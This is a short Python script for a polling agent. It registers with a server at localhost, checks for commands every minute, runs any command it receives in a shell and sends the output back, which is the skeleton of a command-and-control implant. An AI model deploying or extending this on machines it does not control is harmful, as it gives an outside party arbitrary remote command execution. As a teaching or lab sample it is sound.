#!/usr/bin/env python3
"""
agent.py - Minimal polling agent with persistent ID

- Registers with the server
- Polls for commands
- Executes locally and returns results
- Agent ID persists between runs, stored in ~/.agent_id
"""

import requests
import time
import platform
import subprocess
import uuid
import os

SERVER_URL = "http://localhost:5000"
AGENT_ID_FILE = os.path.expanduser("~/.agent_id")


def load_or_create_agent_id():
    """Load agent ID from ~/.agent_id or create a new one."""
    try:
        if os.path.exists(AGENT_ID_FILE):
            with open(AGENT_ID_FILE, "r") as f:
                return f.read().strip()
        new_id = str(uuid.uuid4())
        with open(AGENT_ID_FILE, "w") as f:
            f.write(new_id)
        return new_id
    except Exception as e:
        print(f"[!] Failed to read/write agent ID: {e}")
        return str(uuid.uuid4())


AGENT_ID = load_or_create_agent_id()


def register():
    try:
        requests.post(f"{SERVER_URL}/register", json={'id': AGENT_ID})
        print(f"[+] Registered as {AGENT_ID}")
    except Exception as e:
        print(f"[!] Registration failed: {e}")


def get_command():
    try:
        r = requests.get(f"{SERVER_URL}/get_command/{AGENT_ID}", timeout=5)
        return r.json().get('command')
    except Exception as e:
        print(f"[!] Command check failed: {e}")
        return None


def send_result(result):
    try:
        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", json={'result': result})
    except Exception as e:
        print(f"[!] Failed to send result: {e}")


def run_command(cmd):
    if cmd == "info":
        return platform.platform()
    elif cmd == "ping":
        return "pong"
    else:
        try:
            return subprocess.getoutput(cmd)
        except Exception as e:
            return f"Error: {e}"


def main():
    register()
    while True:
        cmd = get_command()
        if cmd:
            print(f"[*] Running command: {cmd}")
            result = run_command(cmd)
            send_result(result)
        time.sleep(60)


if __name__ == "__main__":
    main()
